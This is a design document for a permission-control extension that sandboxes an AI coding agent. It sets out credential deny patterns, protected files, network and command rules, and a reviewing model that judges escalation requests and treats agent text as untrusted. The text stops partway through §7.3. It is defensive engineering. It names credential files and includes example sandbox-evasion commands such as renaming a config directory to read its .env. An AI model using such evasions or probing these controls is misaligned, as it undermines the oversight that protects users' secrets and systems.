# Permission control (cypher-permissions)

> **Who decides** (2026-11-18, §7.3): the reviewing model decides nearly everything. A
> command's risk tier comes from a deterministic classifier (`risk.ts`): an **inspection**
> runs outside the sandbox without asking; **local** work goes to the model, wherever it
> touches this machine; a **danger** (it reaches other people or shared systems, or cannot
> be undone) runs on the model's approval only when the code confirms a fact of its own —
> the owner's own words asking for exactly it (§7.3.2), or that it touches nothing but
> what this task made itself (§7.3.3). Two things always ask the user, with no model and
> no rule: a secret or credential leaving this machine, and a change to the permission
> system's own files (§7.3.1). The earlier layering is in
> [permission-friction.md](permission-friction.md); this document describes the design as
> it stands.

Status: **phases 0–4 implemented** (Runtime 1.1.0.2; off by default since 1.1.0.3; leaving the sandbox since 1.1.0.4, which needs Cypher 0.3.49; §10).

The Runtime extension `pi-runtime/extensions/cypher-permissions.ts` (modules in
`pi-runtime/extensions/cypher-permissions/`) replaces the npm package
`pi-permission-control` 0.2.0, which Cypher used to ship disabled. That package is
dropped from the bundle; the engine prunes its stale `settings.json` entry like any
retired curated package.

**Master switch.** Permission control is off unless the user's `permissions.json` sets
`"enabled": true` (the switch at the top of Settings → Permissions; a project's file
cannot turn it on). The extension reads it when Pi starts, so it applies from the next
run; while off it registers nothing (no tool overrides, no `request_permission`, no
commands) and Pi's own tools run unchecked.

## 1. Goals

Control what an agent session can touch, with a model simple enough to explain in one
table:

- **Files**: which paths a session may read or write.
- **Commands**: every AI-issued shell command runs inside an OS sandbox
  ([Landstrip](https://github.com/landstrip/landstrip): Seatbelt on macOS, Landlock +
  seccomp on Linux) whose policy is compiled from the same rules.
- **Network**: whether a command may reach the network.
- **Elevation**: anything outside the defaults goes through one approval pipeline, whose
  behavior the user chooses: always deny, always ask, or model-assisted.
- **Leaving the sandbox**: a command that needs what the sandbox withholds (credentials,
  keys, other processes, system services) runs outside it, as the user, once the user
  allows it: for that run, or for matching commands from then on (§6.3).

Non-goals are listed in §11. This is not a VM: it protects against model mistakes and
prompt-injection-driven misuse, not against a determined attacker running as the same
user.

## 2. Concepts

| Term | Meaning |
|---|---|
| **Zone** | Classification of a path: `workspace`, `external`, `sensitive` |
| **Guard** | A write rule on top of the zone: `protected` or `self` (§3.4, §3.5) |
| **Capability** | `read`, `write` (write includes read) |
| **Decision** | Per zone × capability: `allow`, `elevate`, `deny` |
| **Approval mode** | How an elevation is decided: `deny`, `ask`, `assisted` |
| **Grant** | A recorded approval: what it covers and for how long (`once`, `chat`, `always`) |
| **Level** | A named preset of decisions, chosen per chat (§5.2) |
| **Command rule** | A pattern of command words: matching commands run outside the sandbox (`allow`), ask first (`ask`) or never run (`deny`) (§6.3) |

## 3. Zones and guards

### 3.1 Classification

Every path is canonicalized first: `~` expanded, a leading `@` stripped, made absolute
against the tool's cwd, `..` resolved, symlinks followed with `realpath` (native, so on
a case-insensitive macOS volume `~/.SSH` becomes `~/.ssh`). A path that does not exist yet
is resolved through its nearest existing ancestor. Then:

```text
sensitive  if it matches a sensitive pattern      (checked first, always wins)
workspace  else if it is under a workspace root
external   otherwise
```

On top of the zone, a path may be write-guarded: `self` is checked before `protected`.
Pattern matching ignores case on macOS.

**A workspace's own folder.** The engine gives each workspace bot a folder inside
Cypher's data (`<data>/orgs/<org>/<user>/bots/<id>`, or `<data>/profiles/<name>/bots/<id>`
without an account) and runs that workspace's chats there. For a chat whose project
folder it is, it is the project like any other (`config.ts` `ownFolders`,
`PathContext.ownFolders`): the patterns that cover the whole folder because of where it
lies (`~/.cypher*/orgs/**` as other chats' data, `~/.cypher/**` as Cypher's own) do not
apply inside it, and the sandbox carves it out of the directories it denies for where they
are. A secret in it (`.env`, a key) is still sensitive, its `.git/config` still protected,
and every other folder of Cypher's data, another workspace's among them, stays what it
was. Only a folder of that shape in the running instance's data counts: a chat opened on
`~/.ssh` or on the data directory earns nothing.

An explicit exception inside a sensitive directory (`!~/.ssh/config`) splits it: the
sandbox denies the directory's other entries one by one instead of the whole directory.

**Pattern syntax**: `~/x` is in the home directory, `<root>/x` in each workspace root, a
pattern starting with `**` and `/` matches anywhere, `/**` at the end also matches the
directory itself, and a leading `!` is an exception within its list (`!**/.env.example`).

### 3.2 Workspace roots

- The chat's cwd.
- The Git top level of the cwd (`git rev-parse --show-toplevel`), so `cd ..` inside a
  repository is still the workspace.
- Extra roots the user adds for the chat with `/perm-root add <path>` (stored in the
  session, §7.5).

**Writable support paths** are not workspace, but builds break without them. Shell
commands may write them whenever the level lets them write the workspace:

- Temp: `os.tmpdir()`, `$TMPDIR`, `/tmp`, `/private/tmp`, `/var/tmp`, and devices
  (`/dev/null`, `/dev/tty`, …; on macOS also `/dev/stdout`, `/dev/stderr`, `/dev/fd`).
- Toolchain caches (editable): `~/.npm`, `~/.cache`, `~/Library/Caches`,
  `~/.cargo/registry`, `~/.cargo/git`, `~/go/pkg/mod`, `~/.gradle/caches`,
  `~/.pnpm-store`, `~/.bun/install/cache`, `~/.yarn/berry/cache`, and `~/.ssh/known_hosts`.

### 3.3 Sensitive patterns

Defaults (editable, `config.ts` `DEFAULT_SENSITIVE`):

| Group | Patterns |
|---|---|
| Credentials in the home directory | `~/.ssh/**` (except `config`, `known_hosts`, `known_hosts.old` and `*.pub`: not secret), `~/.gnupg/**`, `~/.aws/**`, `~/.azure/**`, `~/.config/gcloud/**`, `~/.kube/**`, `~/.docker/config.json`, `~/.netrc`, `~/.npmrc`, `~/.pypirc`, `~/.config/gh/**`, `~/.git-credentials`, `~/.config/git/credentials`, `~/Library/Keychains/**`, `~/Library/Cookies/**`, browser profiles (Chrome, Brave, Edge, Arc, Firefox, Safari, Chromium) |
| Secrets in any project | `**/.env`, `**/.env.*` (except `.env.example`, `.env.sample`, `.env.template`), `**/*.pem`, `**/*.key`, `**/id_rsa*`, `**/id_ed25519*`, `**/id_ecdsa*`, `**/*.p12`, `**/*.pfx`, `**/*.keystore`, `**/*.jks` |
| Cypher's and Pi's own secrets | `~/.cypher*/session.json`, `profiles/`, `orgs/` (and the same one level down, for development data dirs), `pi-runtime/agent/auth.json`, `mcp-auth.json`, `sessions/` (other chats' transcripts), `~/.pi/agent/auth.json`, `~/.pi/agent/sessions/**`. Not `orgs/*/*/uploads/**` and `profiles/*/uploads/**`: what the user attached to a chat is there to be read (it stays Cypher's own to write, §3.5) |

### 3.4 Protected paths (write guard, judge may approve)

Some paths are not secret but are dangerous to write: a write there runs code outside the
sandbox later. A Git hook runs when the user commits; `.git/config` can set
`core.fsmonitor` or `core.sshCommand`; shell startup files run in every new terminal.

Protected paths keep their zone (`.git/config` stays workspace: readable, network
unaffected) and add one rule: **writes need elevation, `assisted` by default**. The judge
sees that the path is protected and why, plus the diff for file-tool edits. `git remote
add` after "publish this repo" passes; an unexplained `core.fsmonitor` goes to the human.

Defaults: `**/.git/config`, `**/.git/config.worktree`, `**/.git/hooks/**`,
`<root>/.pi/permissions.json` (a project's own rules only tighten, so removing one loosens
them; it is also part of the permission system, §3.6, so the file tools ask the user and
the sandbox refuses the write),
`<root>/.gitmodules`, `<root>/.envrc`, `<root>/.vscode/tasks.json`, `<root>/.husky/**`,
`~/.ssh/config` (`ProxyCommand`), `~/.gitconfig`, `~/.config/git/**`, the zsh/bash/profile startup files,
`~/.config/fish/**`, `~/Library/LaunchAgents/**`, `~/.config/systemd/user/**`,
`~/.config/autostart/**`.

### 3.5 Self (write guard, only a human approves)

`~/.cypher*/**` and `~/.pi/**`, except `~/.cypher*/worktrees/**` (and one level down for
development data dirs), where chats work. This covers the policy file, the audit log,
Pi's `settings.json` (which lists the extensions, this one included), the Runtime's
binaries and every extension's code.

The shell must still read and execute the Runtime (its `bin/` directories are first on
`PATH`), so self data is readable; only its secrets (§3.3) are not. A write needs a human:
the judge must never approve an edit to its own policy. The list cannot be edited.

A path this task made itself is exempt from the `protected` guard, never from `self`,
`sensitive` or §3.6: a dev instance the chat started keeps its own Runtime under
`~/.cypher-development/<instance>/pi-runtime`, and installing into it is the chat's own
work (§7.3.3).

### 3.6 The permission system's own files (always ask)

Changing what permission control does next is never automatic: no rule, grant or
reviewing model approves a write to these (`config.ts` `DEFAULT_PERMISSION_SYSTEM`,
`permissionSystemPatterns`, `PathContext.isPermissionSystem`), whatever the owner wrote.
Reading them is ordinary work: a diagnosis reads the audit log.

- the policy: `<agent-dir>/permissions.json`, any instance's
  `~/.cypher*/**/pi-runtime/agent/permissions.json`, `~/.pi/agent/permissions.json`, and a
  project's `**/.pi/permissions.json`;
- the settings that say which extensions load: `…/agent/settings.json`;
- the extension's own code: `…/agent/extensions/**` and
  `~/.cypher*/pi-runtime/versions/*/extensions/cypher-permissions*`;
- the audit log and the judge's health file: `…/agent/permission-audit.jsonl`,
  `…/agent/cypher-permissions/**`;
- the session files an approval is restored from: `…/agent/sessions/**` (a chat grant and
  the record of what the task made live there, so a forged line would be a grant).

## 4. Default permissions

### 4.1 File matrix (level `standard`)

| | read | write |
|---|---|---|
| workspace | allow | allow |
| external | allow | **elevate** (`assisted`) |
| sensitive | **elevate** (`ask`) | **elevate** (`ask`) |
| protected guard | zone's rule | **elevate** (`assisted`) |
| self guard | zone's rule | **elevate** (human only) |

### 4.2 Network

Sandboxed commands never read a secret: a sensitive grant serves the file tools only
(§7.5). So they keep the network. A command that needs a secret and the network (`git
push` over SSH or HTTPS, `gh pr create`, a cloud CLI) runs outside the sandbox instead,
once the user allows it (§6.3).

Other network rules for every sandboxed command:

- Local binding (dev servers, tests on `localhost`): allowed (`network.localBinding`).
- Unix sockets: denied, which covers `docker.sock` (root-equivalent) and `SSH_AUTH_SOCK`.
  Commands that need one (the `docker` CLI, ssh-agent, GPG-signed commits) run outside the
  sandbox when allowed, or list a socket in `network.unixSockets`.
- The ripgrep behind `grep` never has the network.

**Filtered mode** (`network.mode: "filtered"`, Settings → Permissions → Network). Commands
lose direct network access and get `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` pointing at a
per-process Landstrip filter proxy on `127.0.0.1` (credentials in the URL, so only these
commands can use it; `NO_PROXY` covers localhost). The proxy refuses private and loopback
destinations (cloud metadata included). A domain on the allowlist passes: built in are
GitHub, npm, Yarn, PyPI, crates.io, the Rust and Go toolchains, Maven Central, RubyGems and
Docker Hub, plus `network.allowDomains` (`*.x` covers subdomains). Any other domain is a
`network` elevation (`assisted` by default) asked in the running command's context:
"Allow for this command", "Allow for this chat" (a `net:<domain>` grant), "Always allow"
(a `net:<domain>` rule). Programs that ignore the proxy variables (ssh) run outside the
sandbox when allowed (§6.3). A project's file may switch its chats to filtered mode, never
back.

### 4.3 Secrets in the environment

A sandboxed command's environment drops variables matching `*_TOKEN`, `*_SECRET`,
`*_SECRET_KEY`, `*_API_KEY`, `*_APIKEY`, `*_PASSWORD`, `*_ACCESS_KEY`, `*_PRIVATE_KEY`,
`AWS_*`, `GH_TOKEN`, `GITHUB_TOKEN`, `SSH_AUTH_SOCK`, `CYPHER_ENGINE_SOCKET` (editable).
A command that needs one runs outside the sandbox, with the user's whole environment.

## 5. Configuration

### 5.1 Files

`<agent-dir>/permissions.json` (the Pi agent directory, under Cypher's data directory, so
the file is self-guarded). Every field is optional; lists take `{ "add": [], "remove": [] }`
(a bare array adds):

```json
{
  "version": 1,
  "defaultLevel": "standard",
  "levels": { "standard": { "external": { "read": "allow", "write": "elevate" } } },
  "approval": {
    "external.write": "assisted",
    "protected.write": "assisted",
    "sensitive.read": "assisted",
    "sensitive.write": "assisted",
    "network": "assisted",
    "tools": "assisted",
    "escalate": "assisted"
  },
  "judge": { "model": null, "timeoutMs": 20000 },
  "ask": { "timeoutMs": null },
  "sensitive": { "add": [], "remove": [] },
  "protected": { "add": [], "remove": [] },
  "writableSupport": { "add": [], "remove": [] },
  "envScrub": { "add": [], "remove": [] },
  "network": { "mode": "open", "allowDomains": { "add": [] }, "localBinding": true, "unixSockets": [] },
  "tools": { "mcp": "allow", "overrides": { "mcp:github": "elevate" } },
  "rules": []
}
```

- Approval modes are keyed `<zone>.<capability>`, `protected.write`, `self.write`,
  `network`, `tools`, `escalate`. Every kind defaults to `assisted` (the model first);
  a key with no default (`workspace.write` at the read-only level) means `ask`.
- `rules` holds "always allow" grants (§7.5); `tool:<name>` rules allow a tool,
  `net:<domain>` rules a domain.
- `tools.mcp` is the default for MCP and other extension tools; `overrides` set one tool
  (`mcp__github__create_issue`) or one MCP server (`mcp:github`).

**A project's file only tightens.** `<root>/.pi/permissions.json` may add sensitive and
protected patterns (not exceptions), make level decisions and approval modes stricter, and
tighten tool decisions. Nothing else is read: the agent can write the project, and the
project itself may be hostile.

**Safety rule no file can change**: `self.write` is `ask` unless set to `deny`; the model
never approves a write to Cypher's own data.

### 5.2 Levels and Cypher's per-chat sandbox setting

Cypher stores a `SandboxLevel` per chat (`crates/proto/src/agent.rs`). The harness passes
it to Pi as `CYPHER_PERMISSION_LEVEL` (`crates/harness/src/pi/spawn.rs`); discovery and
slash-command processes get none and use `defaultLevel`.

| `SandboxLevel` | Shown as | Extension level | Difference from `standard` |
|---|---|---|---|
| `ReadOnly` (`read-only`) | Ask before edits | `read-only` | workspace `write: elevate` |
| `WorkspaceWrite` (`workspace-write`) | Edit project (default) | `standard` | §4.1 |
| `DangerFullAccess` (`danger-full-access`) | Full access | `full-access` | no checks: file tools and bash run unsandboxed and unchecked |

The level is picked with **`/permissions`** in the composer's `/` menu: a composer-local
entry leading "Agent modes" for Pi chats, listed whatever Settings → Commands turns on
(not in side chats, which run with their parent's level). Its badge shows the level in
effect (amber at Full access); its choices (strictest first, the one in effect checked)
set the level and type nothing. `/permissions ask|workspace|full` typed in full and sent
applies the same way and never reaches the agent. The composer toolbar shows nothing for
the first two levels; at Full access an amber shield appears, which opens the same
choices. For a new chat the pick rides `createChat` and the first `RunRequest`; for an
existing chat it is written to the row with `setChatConfig`. The engine runs a chat with
its **row's** level whatever the request says (`execute_run` in
`crates/engine/src/host/doc_host/commands.rs`): every client sends a fixed default, older
iOS builds included. Title generation runs `ReadOnly`.

## 6. Enforcement

| Surface | Mechanism | Strength |
|---|---|---|
| `read`, `write`, `edit`, `ls` | Re-registered under their own names, built from Pi's factories with checked filesystem operations (§6.1) | Enforced at each filesystem call, in the Pi process |
| `grep` | Same, and ripgrep runs inside Landstrip (Runtime patch, §6.4) | **OS-enforced** |
| `find` | Search root checked; fd runs as is: file names are not secrets | Policy check |
| `apply_patch` (pi-codex-tools) | Patch headers pre-checked; its file operations go through the same checks (Runtime patch, §6.4) | Enforced at each filesystem call |
| AI `bash` | Landstrip with a policy compiled per command (§6.2) | **OS-enforced**, inherited by every child process |
| Nested calls (codemode) | The same tools | Same |
| MCP and extension tools | Tool-level decision: `allow` (default), `elevate` or `deny` | The tool's internals are not sandboxed |
| Subagents (child chats) | The same extension in the child's Pi; dialogs reach the UI like any child question. A child's `--tools` allowlist that names a file tool also gets `request_permission`, which Pi would otherwise drop (the engine, and a Runtime patch for runs pi-agent-squad spawns itself) | Same |
| User `!` / `!!` commands | Not intercepted (the user's own action) | — |
| Pi itself, other extensions, MCP server processes | Not sandboxed | Out of scope (§11) |

### 6.1 File tools

Pi lets an extension register a tool under a built-in's name, and that definition replaces
the built-in. The built-in factories accept filesystem operations (`ReadOperations`,
`WriteOperations`, `EditOperations`, `LsOperations`, `GrepOperations`), so the tools keep
Pi's behavior, rendering and output; only the disk access changes. Three layers:

1. **Authorization before the call.** The tool's target path is classified; an
   elevation runs the approval pipeline (§7) and yields the canonical paths approved for
   this call. A blocked call throws, and the error tells the agent how to elevate.
2. **Checked operations.** Every `readFile`, `writeFile`, `mkdir`, `readdir` and `access`
   re-checks the absolute path it is about to touch, after `realpath`, against the level,
   the call's approvals, the grants and the rules. Paths the tool assembled itself
   (Pi's NFD and curly-quote fallbacks, `mkdir -p` parents) are covered. Against a
   symlink swapped between the check and the open, a file is opened first
   (`O_NOFOLLOW` on the last component) and verified second: the opened file's device and
   inode must equal what is at the checked canonical path, still reached without a
   symlink. Writes open without truncating and truncate through the verified descriptor.
3. **The OS sandbox for ripgrep** (§6.4).

`read`/`write`/`edit`/`ls` run inside Pi's process, so their guarantee rests on this code,
not on the kernel; the agent cannot bypass it because it can only pass tool arguments.

Results of a sensitive read go into the model's context and so to the model provider; the
dialog says so.

### 6.2 Bash

The bash tool is created per call with Pi's `spawnHook`: Pi runs
`exec <landstrip> run -p <policy> -- <shell> -c <command>` (the same shell Pi would use:
`shellPath` or `/bin/bash`; `shellCommandPrefix` stays in front of the command). The
transcript and the UI show the agent's command, not the wrapper. The environment is
scrubbed (§4.3). The policy file lives in a private temp directory and is removed after
the call.

The policy for one command:

```text
allowRead   = ["/"]
denyRead    = sensitive paths (no sensitive grant reaches a command)
allowWrite  = workspace roots + writable support + temp + devices + write grants
              ("/" when the level lets the external zone be written)
denyWrite   = (sensitive + protected + self) paths inside a writable root − write grants
              + every ancestor of those, between the writable root and the path,
                as a single-entry pattern
network     = allowNetwork (filtered mode: only the filter proxy);
              local binding per config; no Unix sockets but those listed
```

Facts measured with the bundled Landstrip 0.18.38 that shaped this:

- **Reads stay open.** A `denyRead` without `allowRead: ["/"]` makes Landstrip enumerate
  every sibling of every denied path at launch; a file the command creates afterwards in
  those directories (a fresh `node_modules`) would be unreadable to it.
- **Exact paths, found by ripgrep.** A glob in the policy is expanded by Landstrip walking
  the tree at every launch: 3.1 s on this repository with a 42 GB `target/`. The extension
  resolves patterns itself (`discover.ts`): `~/x` and `<root>/x` directly, single-component
  globs by reading the directory, and anywhere-patterns with ripgrep's parallel walker
  over the workspace roots on every command (0.1 s for 104k files). The rest of the home
  directory is covered by a cached index (`<agent-dir>/cypher-permissions/home-index.json`,
  6 s to build, refreshed in the background after 10 minutes, skipping caches and
  `node_modules`). Within one turn the result is reused for 1.5 s.
- **Ancestors are protected.** Without that, `mv config config2 && cat config2/.env`,
  `ln config/.env x`, or renaming `.git` and editing a copy of its config moves a
  protected file out from under its rule. A path whose last character is a one-character
  class (`/w/.gi[t]`) becomes an anchored pattern that denies the directory entry, not its
  contents: Git still commits, branches, tags and gcs normally.
- **Git's `config.lock` rename** over a denied `.git/config` is blocked too.
- Writing outside `allowWrite` fails with `EPERM`, including `$TMPDIR` and `/dev/null`
  unless listed. `allowNetwork: false` blocks DNS and connects. A launch costs ~66 ms.

Missing patterns: a protected path that does not exist yet (`<root>/.envrc`) is still
write-denied (creating it is the risk); a missing sensitive path needs no read rule.

### 6.3 Bash denials and running outside the sandbox

macOS Seatbelt is fixed at process start and reports no per-access events, so a command
that needs more than the sandbox gives fails first:

1. The command hits `EPERM`, or fails like a wrong credential (a key or token the sandbox
   hides).
2. If its output looks like the sandbox's doing (`Operation not permitted`, `Permission
   denied`, DNS failures, `Host key verification failed`, `Authentication failed`, `not
   logged in`, the keychain), the tool result gets a hint: what the sandbox blocks, and to
   run the command again with `escalate`. An ordinary failure gets no hint.
3. The agent runs it again with `escalate` (below); the user decides.

On Linux, Landstrip also prints JSON denial events (`FILESYSTEM_DENIED`,
`NETWORK_DENIED`): the extension strips them from the output, lists the blocked paths in
the hint and records them in the audit log.

**Leaving the sandbox.** Many tasks reach something the sandbox cannot express: a server
over SSH (keys, agent socket, known hosts), a Git remote (the keychain's credential
helper), `gh`, cloud CLIs, `launchctl`, `kill` of another process, a simulator. Rather than
widening the sandbox piece by piece, such a command runs **outside it, as the user**. The
extension does not need to understand the program; the user approves the command (and,
optionally, a pattern for similar ones).

The bash tool takes an optional `escalate: { label, reason, patterns? }`. `label` says what
the command is for in plain words, `patterns` are command rules the agent may propose for
later commands; each command it leaves uncovered gets its **category** (below). Command
rules (`commands.ts`, in `permissions.json`'s `commands`, a project's
`.pi/permissions.json`, or the chat's grants):

```jsonc
{ "match": ["git", "push", "**"], "decision": "allow", "label": "Push to GitHub" }
{ "match": ["git", "push", "**", "--force", "**"], "decision": "ask" }
{ "match": ["kubectl", "delete", "**"], "decision": "deny" }
{ "match": ["./scripts/deploy.sh", "**"], "decision": "allow", "sha256": "9f2c…" }
```

- A pattern is the program, then words: `*` and `?` glob within a word, `**` stands for
  any number of words. The program is literal and matches by name (`git` matches
  `/usr/bin/git`); a pattern naming a path matches that path as written.
- Shells, interpreters and wrappers cannot start a pattern (`sh`, `bash`, `env`, `sudo`,
  `xargs`, `python`, `node`, `npx`, `awk`, `sed`, `find`, …): a rule on them would cover
  any command. Nor can the builtins that run scripts or change the shell's variables and
  lookups (`source`, `.`, `trap`, `export`, `set`, `read`, `hash`, …). `cd`, `echo`,
  `test` and other inert builtins never need to leave; neither does `set` with only
  `-e`/`-u`/`-x`/`-o pipefail`, but `printf -v` (it sets a variable) does.
- **Filters** need no rule either (`filterInputs`): `cat`, `head`, `tail`, `wc`, `sort`,
  `uniq`, `cut`, `tr`, `grep` and `awk`/`sed` given a program that only prints, when all
  they do is read their input or files the sandbox may read and write their output. So
  `ssh web 'sinfo' | awk '{print $2}' | sort | uniq -c` needs a rule for `ssh` alone, and
  can be allowed for the chat. Only listed options count (not `sort -o`, `sed -i`,
  `grep -r`, `awk -f`, …), no word may be unknown, and the program must resolve outside
  the places sandboxed commands can write. An awk program may not hold `system`,
  `getline`, `ARGV`, `ARGC`, `ENVIRON`, `PROCINFO`, `SYMTAB`, `FUNCTAB` or `@` anywhere,
  a pipe, or a `>` that redirects a `print`; a sed script holds only addresses,
  `p d n N g G h H x l q Q z = { }`, `y` and `s` with flags `g p i I m M` and a number.
  A regular expression whose delimiter stands inside a bracket expression (`/[/]/`) is
  refused: implementations end it at different places. Options after an operand count as
  operands too, the way BSD tools read them.
- **Reading the line** (`shell.ts`) finds every command the line can run: words, quotes,
  `~`, comments; `&&`, `||`, `;`, `|`, `|&` and newlines between commands; the commands
  in `$(…)` and backticks, and in `if`/`while`/`until`/`for … in`, `case … esac`,
  `{ …; }`, `!` and `[[ … ]]` (each read as one that may run); redirections, with the
  files they read and write (a path known only when the line runs is a file all the same:
  no rule vouches for the command, and the rest of the line is still read);
  heredocs and here-strings (input, not commands, inside a substitution too: `git commit
  -m "$(cat <<'EOF' … EOF)"`; an unquoted heredoc holding a substitution is opaque). A
  word known only when the line runs (`$x`, `$(…)`, `$((…))`, an unquoted glob or brace
  list, `~user`) is *unknown*; the reader keeps what it surely starts with (`~/.ssh/id_`
  for `~/.ssh/id_*`, `user.name=` for `user.name="$(…)"`), which says where it points and
  never what a rule may match. `$PWD` is the directory the line starts in, in a line that
  never changes it. `name=value` alone is read when no
  program can see it: not a variable the environment exports (bash runs with the
  engine's), not one bash reads (`PATH`, `IFS`, `CDPATH`, `HOME`, `BASH_*`, …), and not
  when the settings add a shell command prefix. Anything else (nested subshells,
  functions, `(( … ))`, process substitution, `$'…'`, an
  assignment in front of a command that changes how programs run) makes the line
  **opaque**: no rule matches it, so it
  runs in the sandbox, or outside once if the user approves it as written.
- **Deciding**: every command in the line is checked (inert builtins and filters skipped). An unknown
  word matches only `**` in an `allow` rule, but anything a `deny` or `ask` rule names. A
  `deny` that matches blocks the line before it runs, escalated or not. If every command
  matches an `allow`, none could match a `deny` or `ask`, and every redirection reads or
  writes a file the sandbox itself may without asking, the line runs outside without
  asking, with a note in the result (`[permissions] Ran outside the sandbox (allowed by
  …)`). Otherwise it runs in the sandbox, unless the agent escalates and the user approves.
  No rule vouches for `ssh`, `scp` or `sftp` given an option that runs a command on this
  computer (`ProxyCommand`, `LocalCommand`, `KnownHostsCommand`, `Match`, `Include`,
  `-F`, `-S`), or options ssh reads straight after the host.
- **The program must be the one approved**: it is resolved as bash would (a path against
  the working directory, else `PATH`). A program that does not exist is never trusted. A
  program inside a place sandboxed commands can write (the workspace, temp, the writable
  caches) is trusted only at the contents pinned when it was approved (`sha256`); a
  changed file asks again. The agent cannot change `PATH` in the line. A `cd` moves the
  directory only when it surely runs in the line's shell: one after `&&` or `||`, in a
  pipeline, `if`, loop or substitution (or with `CDPATH` set) leaves it unknown, and a
  program or redirection by relative path from an unknown directory is never trusted.
- **Categories**: what Allow for this chat and Always allow cover for a command the agent
  proposed no pattern for (`categoryPattern`). The program and what it does for CLIs whose
  first word says it (`git push …`, `gh pr …`, `xcrun simctl …`, `kubectl get …`, with
  the options before it as written: `git -C ../other push …`), and the script or tool it
  runs (`npm run build …`, `uv run pytest …`); the host for ssh (`ssh deploy@web …`, with
  its options as written); any use of a script named by its path (pinned); the command as
  written for programs whose words are the risk (`rm`, `cp`, `mv`, `tee`, `cat`, `curl`,
  `scp`, `rsync`, `kill`, `open`, `openssl`, `op`, …); any use of other
  programs (`lsof …`). A command already allowed needs none.
- **The request**: proposed patterns are checked before anyone is asked: each must be
  valid and match a command in the line. The dialog reads *Run this command outside the
  sandbox?* with `Purpose`, `Command`, one `Pattern` line each, `Reason`, and notes (it
  runs as the user; a pinned program). Options: Run once, Allow for this chat, Always
  allow, Deny, Deny and stop. When no pattern can cover the line, only Run once, Deny and
  Deny and stop, and a note says why: it is opaque; a program can run any command
  (`python3`) or is known only when it runs; a program allowed only as written is given
  unknown words; a word could turn it into a command a `deny` or `ask` rule names; an ssh
  option rules never vouch for; a redirection the sandbox would not allow. The agent's
  result says the same (`approved once; it could not be allowed for the chat, because
  …`). The model first (`approval.escalate`, `assisted` by default): it may run the
  command once, with no dialog and no rule left behind; otherwise the dialog shows its
  `Review` and the user decides. Without a UI, what the model does not approve is denied.
- **What an approval leaves behind** (since 2026-10-20, permission-friction.md §7): Once,
  nothing. Always in `<project>`, one `allow` rule per pattern in `permissions.json`, with
  the project and the variables it saw assigned. Allow for this task (dangerous commands),
  a task grant per pattern until the user's next message. A reviewing model's approval, a
  chat grant per pattern (`approvedBy: "judge"`).
- A project's file may add `ask` and `deny` rules, never `allow`.
- The level still applies inside the sandbox; outside it nothing does. Full access runs
  everything outside without asking.

### 6.4 Runtime patches

- `patches/pi-coding-agent-grep-spawn-hook.mjs` adds a `spawnHook` option to
  `createGrepToolDefinition`. ripgrep reports which file and line matched before Pi reads
  the line through the checked operations, so without the sandbox a pattern tried one
  character at a time would reveal a secret. The extension runs ripgrep inside Landstrip
  (reads only, no network) and also passes exclusion globs for the denied paths (ripgrep
  exits with an error on the first unreadable file). As defense in depth it drops result
  lines from files the agent may not read.
- `patches/pi-codex-tools-permissions.mjs` routes `apply_patch`'s `open`, `writeFile`,
  `mkdir` and `unlink` through a hook the extension installs on
  `globalThis[Symbol.for("cypher.permissions.fs")]`. It also lets pi-codex-tools keep
  hiding `edit`/`write` from grammar-capable OpenAI models: it recognized the built-ins by
  their `builtin:` source, which the replacements no longer have.

### 6.5 Unsupported hosts

The extension runs `landstrip doctor` once per Pi process. If Landstrip is missing or the
OS sandbox does not work (Linux without Landlock: kernels before 5.13), the extension stands
down: tools run as they would without it, and each chat is told once ("Permission control
is unavailable on this device: …"). `/perm` shows the error.

## 7. Elevation

### 7.1 Requests

- **Automatic**: a file tool call whose path needs elevation.
- **`request_permission`**: `{ capability: "read" | "write", paths, reason }`, ahead of
  file tool calls. Not for bash: the dialog says the approval serves the file tools only,
  and the agent's answer says a command that needs the paths runs with `escalate`
  (approving `~/.ssh` this way never let ssh connect, which confused users).
- **`escalate`** on a bash call: run it outside the sandbox (§6.3).
- **Tool-level**: an MCP or extension tool whose decision is `elevate`.

### 7.2 Approval modes

| Mode | Behavior |
|---|---|
| `deny` | Rejected at once; the agent is told the access is not available |
| `ask` | A human decides |
| `assisted` | The judge first. It has three answers: approve and remember for the chat, approve this call once, or ask the user. It never rejects |

Safety rules:

1. Writes to Cypher's own data and to protected files never use the judge through the
   file tools (there is no target its words could be checked against), and neither does
   the always-ask floor (§7.3.1). Everything else, sensitive reads and commands outside the
   sandbox included, is `assisted` by default (2026-10-15: the model judges first, so the
   user is asked only about what it cannot approve); the user's file or Settings can set
   any kind back to `ask` or `deny`.
2. The judge never rejects. Its only answers are `approve`, `approve-once` and
   `ask-user`, and its approval is the decision (D12). Anything but an approval
   (`ask-user`, any other word, unreadable output, an error, a timeout, no model
   available) asks the user, and the dialog says *"The reviewing model could not approve
   this automatically: <reason>"*. The reason is also recorded in the audit log
   (`reviewer`), with what the model answered (`judgeVerdict`). A danger needs more than
   an approval: the code must confirm the owner's explicit request (§7.3.2).
3. A judge `approve` of local work is kept for the chat (a file access as a `chat` grant;
   a command as `chat` grants for its commands' own categories, never the agent's proposed
   patterns); `approve-once` and any approval of a sensitive file or a danger keep nothing.
   Only a human creates `always` grants or command rules.

When several paths are requested together, the strictest mode wins.

### 7.3 The judge

- **Model**: `judge.model` (`provider/id`), else the chat's current model, through Pi's
  model registry with the user's existing credentials (any provider, including the Claude
  bridge). The call is marked one-off (`cacheRetention: "none"`): the Claude bridge
  serves it in a separate Claude Code process with the judge's own system prompt and no
  tools, where it would otherwise refuse a system prompt the chat never recorded. A judge
  that fails says why in the dialog's Review row (the provider's error, or that it did
  not answer in time).
- **Trusted input**: the conversation's last six user messages (the latest up to 12,000
  characters, earlier ones up to 4,000; a longer one loses its middle, never its end,
  since a long brief often puts the step at hand last), the request (capability:
  `read`, `write`, `network`, `tool` or `escalate`; paths, zone, guard and why, tool,
  level, workspace roots). For a danger, also the owner's own words (§7.3.2) and what the
  command acts on as Cypher read it. When some user messages were written by an agent (a
  plan's brief, an orchestrator's steering), the prompt says so: they count for local
  development work only.
- **Untrusted input**, fenced in `<untrusted>` (nested tags stripped): the command, a tool
  call's input, the agent's justification (for a command, its purpose and reason), its
  last eight tool calls, and the change for writes.
- **What it asks the user about** (beyond anything the user did not ask for or that
  reaches further than needed): a protected write that could run code later; sending data
  off the machine; a sensitive file the user did not ask about by name or by what it
  holds; a destructive or hard-to-undo command or tool call (deleting or overwriting what
  this task did not make, force-pushing, publishing, deploying, sending messages, paying,
  killing processes that are not its own, changing system settings) the user did not ask
  for exactly; a host, account, repository or service the user did not mention;
